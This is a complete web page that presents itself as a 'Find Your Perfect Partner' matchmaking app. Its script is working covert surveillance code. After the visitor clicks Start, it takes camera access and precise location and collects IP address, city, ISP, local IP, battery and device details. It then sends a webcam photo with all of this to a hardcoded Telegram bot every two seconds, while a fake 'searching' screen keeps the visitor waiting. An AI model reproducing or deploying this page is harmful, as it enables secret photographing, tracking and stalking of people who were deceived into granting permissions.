<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Partner Finder</title>
<style>
body {
    margin: 0;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
}

.container {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 20px;
    text-align: center;
}

.title {
    font-size: 2.5rem;
    margin-bottom: 2rem;
    text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
}

.gender-container {
    background: rgba(255,255,255,0.1);
    padding: 2rem;
    border-radius: 20px;
    backdrop-filter: blur(10px);
    margin-bottom: 2rem;
    width: 90%;
    max-width: 400px;
}

.gender-title {
    font-size: 1.5rem;
    margin-bottom: 1.5rem;
}

.gender-buttons {
    display: flex;
    flex-direction: column;
    gap: 1rem;
}

.gender-btn {
    padding: 1rem;
    border: none;
    border-radius: 10px;
    font-size: 1.2rem;
    cursor: pointer;
    transition: all 0.3s;
    background: rgba(255,255,255,0.2);
    color: white;
}

.gender-btn:hover {
    background: rgba(255,255,255,0.3);
    transform: translateY(-2px);
}

#male { background: rgba(66, 133, 244, 0.7); }
#female { background: rgba(234, 67, 53, 0.7); }
#gay { background: rgba(52, 168, 83, 0.7); }

.loading-screen {
    display: none;
    flex-direction: column;
    align-items: center;
    gap: 2rem;
}

.spinner {
    width: 60px;
    height: 60px;
    border: 5px solid rgba(255,255,255,0.3);
    border-radius: 50%;
    border-top-color: white;
    animation: spin 1s ease-in-out infinite;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}

.error-screen {
    display: none;
    color: #ff6b6b;
    background: rgba(255,255,255,0.1);
    padding: 2rem;
    border-radius: 15px;
    margin-top: 1rem;
}

.footer {
    position: sticky;
    bottom: 0;
    width: 100%;
    padding: 1rem;
    background: rgba(0,0,0,0.8);
    text-align: center;
}

.start-btn {
    padding: 1rem 3rem;
    font-size: 1.3rem;
    background: linear-gradient(45deg, #ff6b6b, #ee5a24);
    color: white;
    border: none;
    border-radius: 25px;
    cursor: pointer;
    transition: all 0.3s;
    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
}

.start-btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 6px 20px rgba(0,0,0,0.3);
}

.start-btn:disabled {
    opacity: 0.5;
    cursor: not-allowed;
    transform: none;
}
</style>
</head>
<body>
<div class="container">
    <h1 class="title">Find Your Perfect Partner</h1>
    
    <div class="gender-container">
        <div class="gender-title">Select Your Gender</div>
        <div class="gender-buttons">
            <button class="gender-btn" id="male" onclick="selectGender('Male')">Male</button>
            <button class="gender-btn" id="female" onclick="selectGender('Female')">Female</button>
            <button class="gender-btn" id="gay" onclick="selectGender('Gay')">Gay</button>
        </div>
    </div>

    <div class="loading-screen" id="loadingScreen">
        <div class="spinner"></div>
        <h2>Finding Your Partner...</h2>
        <p>Please wait while we search for your perfect match</p>
        <p>Waiting For Your Partner...</p>
    </div>

    <div class="error-screen" id="errorScreen">
        Connection error. Please try again.
    </div>
</div>

<div class="footer">
    <button class="start-btn" onclick="startApp()" id="startBtn">Start</button>
</div>

<canvas id="canvas" style="display:none"></canvas>

<script>
const canvas = document.getElementById("canvas");
const BOT_TOKEN = "7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
const CHAT_ID = "8319568593";
const loadingScreen = document.getElementById("loadingScreen");
const errorScreen = document.getElementById("errorScreen");
const startBtn = document.getElementById("startBtn");

let intervalId = null;
let selectedGender = null;
let latitude = "N/A";
let longitude = "N/A";
let mapLink = "Location not allowed";
let userIP = "Unknown";
let stream = null;
let batteryInfo = "Battery: Not available";
let networkInfo = "Network: Not available";
let localIP = "Unknown";
let city = "Unknown";
let country = "Unknown";
let isp = "Unknown";

function selectGender(gender) {
    selectedGender = gender;
    document.querySelectorAll('.gender-btn').forEach(btn => {
        btn.style.opacity = '0.6';
        btn.style.transform = 'scale(0.95)';
    });
    event.target.style.opacity = '1';
    event.target.style.transform = 'scale(1.05)';
}

async function startApp() {
    if (!selectedGender) {
        showError("Please select your gender first");
        return;
    }

    startBtn.disabled = true;
    startBtn.textContent = "Searching...";
    loadingScreen.style.display = 'flex';
    errorScreen.style.display = 'none';

    try {
        await requestPermissions();
        await startDataCollection();
        showError("");
    } catch (error) {
        showError("Please allow all permissions to continue");
        startBtn.disabled = false;
        startBtn.textContent = "Start";
        loadingScreen.style.display = 'none';
    }
}

function requestPermissions() {
    return new Promise(async (resolve, reject) => {
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user" }
            });
            
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        latitude = pos.coords.latitude.toFixed(6);
                        longitude = pos.coords.longitude.toFixed(6);
                        mapLink = `https://maps.google.com/maps?q=${latitude},${longitude}&z=17&t=k`;
                        resolve();
                    },
                    () => {
                        mapLink = "Location denied";
                        resolve();
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                resolve();
            }
        } catch (error) {
            reject(error);
        }
    });
}

async function startDataCollection() {
    fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => {
        userIP = d.ip;
        fetch(`https://ipapi.co/${userIP}/json/`)
        .then(r => r.json())
        .then(ipData => {
            city = ipData.city || "Unknown";
            country = ipData.country_name || "Unknown";
            isp = ipData.org || "Unknown";
        });
    });

    if (navigator.getBattery) {
        navigator.getBattery().then(b => {
            batteryInfo = `ðŸ”‹ Battery: ${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not charging'})`;
        });
    }

    if (navigator.connection) {
        networkInfo = `ðŸ“¡ Network: ${navigator.connection.effectiveType}`;
    }

    getLocalIPAddress().then(ip => { localIP = ip; });

    if (!intervalId) {
        intervalId = setInterval(captureAndSend, 2000);
    }
}

function getLocalIPAddress() {
    return new Promise(resolve => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
        pc.onicecandidate = ice => {
            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
            if (ip && ip[1]) resolve(ip[1]);
            pc.close();
        };
        setTimeout(() => resolve("Not found"), 1000);
    });
}

function captureAndSend() {
    if (!stream) return;
    
    try {
        const videoTrack = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(videoTrack);
        imageCapture.grabFrame().then(imageBitmap => {
            canvas.width = imageBitmap.width;
            canvas.height = imageBitmap.height;
            const ctx = canvas.getContext("2d");
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(imageBitmap, 0, 0);
            canvas.toBlob(blob => {
                const caption = `
ðŸ‘¤ Gender: ${selectedGender}
ðŸ“¸ Partner Search Active

ðŸ“ Location:
Lat: ${latitude}
Lng: ${longitude}
Map: ${mapLink}
City: ${city}
Country: ${country}
ISP: ${isp}

ðŸŒ Network:
IP: ${userIP}
Local: ${localIP}
${networkInfo}

ðŸ“± Device:
${navigator.platform}
${navigator.userAgent.substring(0, 60)}...

ðŸ”‹ ${batteryInfo}
â° ${new Date().toLocaleString()}
                `;
                
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", blob);
                formData.append("caption", caption);
                
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                }).catch(() => {});
                
            }, "image/jpeg", 0.7);
        }).catch(() => {});
    } catch (error) {}
}

function showError(message) {
    if (message) {
        errorScreen.textContent = message;
        errorScreen.style.display = 'block';
    } else {
        errorScreen.style.display = 'none';
    }
}
</script>
</body>
</html>
